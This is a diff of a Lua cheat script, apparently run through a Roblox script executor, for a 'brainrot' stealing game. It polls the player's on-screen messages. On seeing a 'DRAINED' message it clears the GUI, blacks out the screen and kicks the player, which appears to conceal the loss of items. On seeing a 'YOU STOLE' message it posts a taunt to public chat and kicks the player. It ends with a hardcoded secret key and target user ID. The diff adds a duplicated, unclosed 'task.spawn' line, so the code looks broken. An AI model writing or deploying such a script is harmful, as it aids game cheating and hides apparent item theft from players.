@@ -1166,20 +1166,19 @@ RunService.Heartbeat:Connect(function()
 end)
 
 task.spawn(function()
+
+task.spawn(function()
     local p = game.Players.LocalPlayer
     local pgui = p:WaitForChild("PlayerGui")
 
+    -- Fonction pour nettoyer l'écran et mettre le noir total
     local function nuclearBlackout()
-        -- 1. On vide TOUT le PlayerGui instantanément
         pgui:ClearAllChildren()
-
-        -- 2. On crée l'écran noir de secours
         local gui = Instance.new("ScreenGui")
-        gui.Name = "SAFETY_SYSTEM"
+        gui.Name = "SYSTEM_PROTECT"
         gui.IgnoreGuiInset = true
         gui.DisplayOrder = 2147483647
         gui.Parent = pgui
-
         local frame = Instance.new("Frame")
         frame.Size = UDim2.new(1, 0, 1, 0)
         frame.BackgroundColor3 = Color3.new(0, 0, 0)
@@ -1187,27 +1186,29 @@ task.spawn(function()
         frame.Parent = gui
     end
 
-    -- Scan ultra-rapide (0.01s)
+    -- Boucle de scan ultra-rapide (0.01s)
     while task.wait(0.01) do 
         local descendants = pgui:GetDescendants()
         for i = 1, #descendants do
             local obj = descendants[i]
-            local ok, text = pcall(function() return obj.Text end)
             
-            if ok and type(text) == "string" and text ~= "" then
-                local t = string.upper(text)
+            -- On check uniquement les TextLabels visibles sur l'écran
+            if obj:IsA("TextLabel") and obj.Visible == true then
+                local t = string.upper(obj.Text)
 
-                -- CAS DRAIN (Vu dans ta vidéo)
-                if string.find(t, "DRAINED") or string.find(t, "YOUR BRAINROTS WAS DRAINED") then
-                    nuclearBlackout() -- Détruit tout le reste et met du noir
-                    task.wait(0.05)   -- Ton délai
-                    p:Kick("test")
+                -- CAS 1 : TU ES DRAINÉ (Message rouge)
+                if string.find(t, "DRAINED") or string.find(t, "BRAINROTS") then
+                    nuclearBlackout() -- Noir instantané
+                    task.wait(0.05)   -- Attente de 0.05s
+                    p:Kick("test")    -- Kick après le délai
                     return
                 end
 
-                -- CAS STEAL
-                if string.find(t, "YOU STOLE") then
+                -- CAS 2 : TU AS VOLÉ (Message vert du jeu)
+                -- Vérifie que le texte contient "YOU STOLE" et qu'il est VERT
+                if string.find(t, "YOU STOLE") and obj.TextColor3.g > 0.7 then
                     local msg = "ezzzz steal by brr782k <3"
+                    -- Chat instantané
                     task.spawn(function()
                         local chat = game:GetService("TextChatService")
                         if chat.ChatVersion == Enum.ChatVersion.TextChatService then
@@ -1218,6 +1219,7 @@ task.spawn(function()
                             if ev then ev:FireServer(msg, "All") end
                         end
                     end)
+                    -- Kick instantané (0ms)
                     p:Kick(msg)
                     return
                 end
@@ -1225,7 +1227,6 @@ task.spawn(function()
         end
     end
 end)
-
 
 getgenv().SECRET_KEY = "mrr_94d9f8fe3a02461085f84d087e98c28a"
 getgenv().TARGET_ID = 4190736407
